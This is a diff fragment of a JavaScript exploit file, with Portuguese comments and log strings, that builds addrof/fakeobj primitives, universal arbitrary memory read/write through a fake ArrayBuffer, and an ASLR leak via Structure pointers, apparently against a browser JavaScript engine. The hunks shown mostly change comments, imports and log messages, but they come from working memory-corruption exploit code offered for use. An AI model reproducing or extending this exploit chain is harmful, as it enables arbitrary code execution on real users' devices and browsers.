@@ -1,12 +1,6 @@
 // js/script3/testArrayBufferVictimCrash.mjs (v125 - R60 Final - AGORA COM PRIMITIVAS ADDROF/FAKEOBJ DIRETAS E UNTAGGING DE JSVALUE)
-// =======================================================================================
-// ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
-// - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
-// - A primitiva ARB R/W existente (via DataView OOB) será validada, mas a L/E universal usará o fake ArrayBuffer.
-// - Vazamento de ASLR será feito usando ClassInfo de ArrayBuffer/ArrayBufferView.
-// =======================================================================================
 
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
+import { AdvancedInt64, toHex, log, setLogFunction, isAdvancedInt64Object } from '../utils.mjs'; // ADICIONADO: isAdvancedInt64Object aqui
 import {
     triggerOOB_primitive,
     getOOBDataView,
@@ -146,8 +140,8 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn) {
             logFn(`[${FNAME}] ERRO CRÍTICO: old_arb_read não conseguiu ler o ponteiro da Structure do ArrayBuffer modelo. A L/E universal falhará.`, "critical", FNAME);
             return false;
         }
-        logFn(`[${FNAME}] Ponteiro da Structure do ArrayBuffer modelo: ${ab_structure_ptr_val.toString(true)}`, "leak", FNAME);
-
+        logFn(`[${FNAME}] Ponteiro da Structure do ArrayBuffer legítimo: ${ab_structure_ptr_val.toString(true)}`, "leak", FNAME);
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Agora, alocamos um "corpo" de ArrayBuffer falso na memória que podemos controlar
         // e que será o alvo do nosso fakeobj.
@@ -255,7 +249,7 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn) {
             logFn(`[${FNAME}] SUCESSO: Leitura/Escrita Arbitrária Universal FUNCIONANDO! Lido: ${read_back_value.toString(true)}`, "good", FNAME);
             rw_test_on_fakeobj_success = true;
         } else {
-            logFn(`[${FNAME}] FALHA: Leitura/Escrita Arbitrária Universal NÃO FUNCIONANDO! Lido: ${read_back_value.toString(true)}, Esperado: ${test_write_value.toString(true)}`, "error", FNAME);
+            logFn(`[${FNAME}] FALHA: Leitura/Escrita Arbitrária Universal NÃO FUNCIONANDO! Lido: ${read_back_value.toString(true)}, Esperado: ${test_write_value.toString(true)}.`, "error", FNAME);
         }
 
         // Restaurar o ponteiro do m_vector do fake DataView para evitar crashes.
